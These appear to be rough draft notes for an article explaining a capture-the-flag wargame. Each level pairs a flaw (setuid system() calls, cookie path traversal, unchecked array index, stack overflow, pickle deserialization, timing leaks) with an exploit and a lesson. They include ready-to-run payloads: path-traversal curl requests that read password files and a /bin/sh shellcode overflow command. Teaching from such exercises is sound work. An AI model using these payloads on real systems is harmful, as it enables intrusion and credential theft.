- flow
    - point out what's wrong
    - how to crack
    - how to fix / make safer
    - lesson to learn
- conclusion?
    - are your programs and scripts safe enough?
    - are you sure there is no aberrant input that will wreak
      havoc?
    - better check yourself!
- read in the docs:
    __reduce__ ??? 
        seems to get executed in pickle.loads

- what is the point of this article?
- who is the intended audience and why should they care?
- is this for programmers only?
- do you need to be a security expert?
- keep the texts short, interspersed with code, visuals

## Level 1: avoid the "system" call

When you start the Live CD,
you are automatically logged in as user `level00`,
and presented the instructions:

> In /home/level01/.password is the password of the level01 user.
> Your mission, should you choose to accept it, is to read that
> file and login as level01 to advance to the next level.
> You may find the files in /levels/level01 useful.

The goal is to get access to user `level01`,
by somehow reading his password saved in a file
in his home directory.
What can we do here?

> The system() function hands the argument command to the command
> inter-preter sh(1). 

The file `/home/level01/.password` is not readable.
The home directory of `level01` appears to be well- protected,
with permissions `0700`,
owned by user `level01` and group `level01`.

Ok, so let's look at `/levels/level01` as hinted by
the instructions we saw after login:

    $ ls -l /levels/level01
    total 32
    -rw-rw-r--  1 level01  level01    69 Mar  9 19:08 Makefile
    -rwsr-xr-x  1 level01  level01  7352 Mar  9 19:08 level01
    -rw-rw-r--  1 level01  level01   152 Mar  9 19:08 level01.c

Ha! The user permission of the file `level01` looks unusual: `rws`.
What's that?
Normally the 3rd letter in the permission bits
is either `x` or `-`,
indicating whether the file is executable or not.
Here we have `s`,
which indicates the `setuid` bit is set.
`setuid` stands for `set-user-ID-on-execution`.
When you run a program,
normally it's executed as the current user.
But, when the `setuid` bit is set,
the program will run as the owner of the file itself,
as opposed to the current user.
So even though we are logged in as user `level00` now,
when we execute this program it will run as `level01`.

Great, so how can we use this to our benefit?
As we checked earlier,
we cannot read the `.password` file owned by `level01`.
But `level01` could.
And if we run the `setuid` program owned by `level01`,
that process could read the file too.
Well let's just run it and see what happens, eh:

    $ /levels/level01/level01
    Current time: Tue Sep  3 23:55:54 UTC 2013

Ok so that doesn't get us very far.
The program just displays the date,
that's it.
However,
if we take a look at the other files in the directory,
the file `level01.c` looks suspiciously like the source code of
the program:

    #include <stdio.h>
    #include <stdlib.h>

    int main(int argc, char **argv)
    {
      printf("Current time: ");
      fflush(stdout);
      system("date");
      return 0;
    }

The vulnerability: using the "system" call in C with a relative
path

The exploit: that PATH environment variable can be
manipulated to trick the program into executing an arbitrary
script

The lesson: Avoid the "system" call in C, or at least
validate it properly

## Level 2: always validate user input properly

The vulnerability: using a browser cookie and without validation
to read files on the server

The exploit: a cookie can be crafted
with a relative path to reveal the content of sensitive files

- What can go wrong?
- What does the program do? in a nutshell
- Examine all execution paths
- Examine where the input might end up
- How is the user input handled?
- What are valid and invalid inputs?
- What can happen to invalid input?
- What can invalid input cause?
- form parameters
- cookies

     curl http://localhost:8002/ --cookie user_details=../../home/level02/.password
     curl http://localhost:8002/ --cookie user_details=/home/level02/.password

## Level 3: validate command line arguments and array bounds

The vulnerability: using command line arguments without
validation and without checking array bounds

The exploit:
a command line argument can be crafted to trick the program into
doing something unintended
line arguments properly, and always check array bounds

- takes two inputs: a number and a string
- the number must be less than or equal to 4
- the string will be truncated to at most 63 letters
- the index is used to look up a function from an array and call
  it on the string
- so what can go wrong here?
- what happens with a negative index?
- /levels/level03/level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
- we just need the address of that function

> The system() function hands the argument command to the command
> inter-preter sh(1). 


## Level 4:

a variation on Level 3 that is harder to exploit, but with more
tragic consequences, allowing the attacker to execute arbitrary
code

- takes a string parameter from the command line
- uses the string when calling a function
- simply copies the string to a buffer
- pointless program by itself, but string copying is a common
  pattern
- how the call stack works?
    - local vars
    - return address
- write over the local variable and the return address, injecting
  shell code
- shell code?
- the fix? strncpy

    /levels/level04/level04 $(python -c 'print "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*996 + "\xfb\x85\x04\x08"')

## Level 5: validate user input, strictly

The vulnerability: using weakly validated form input as
parameters for pickle loading in Python

The exploit: an HTTP POST
can be crafted that passes the weak validation and tricks the
program into running the injected pickle

The lesson: make sure
your input validation is strong enough, especially if it is used
to unpickle pickles in Python

    do_POST
    raw_data <- "; job: " + pickle.dumps(...)
    type, data, job = queue.run_job(data=raw_data, job=job)
    QueueUtils.enqueue('JOB', data, job)  # data is special, job
    is real
    QueueUtils.serialize(type, data, job)
        returns serialized, but there we injected job: X in front
        of the real one

- pickle.loads(...) seems to execute the pickle...

## Level 6: watch out for time-sensitive methods

The vulnerability: using time sensitive methods in password
validation

The exploit: a script can be crafted to determine the
password by measuring the execution time of validating wrong
passwords

The lesson: be careful with potentially time sensitive
methods

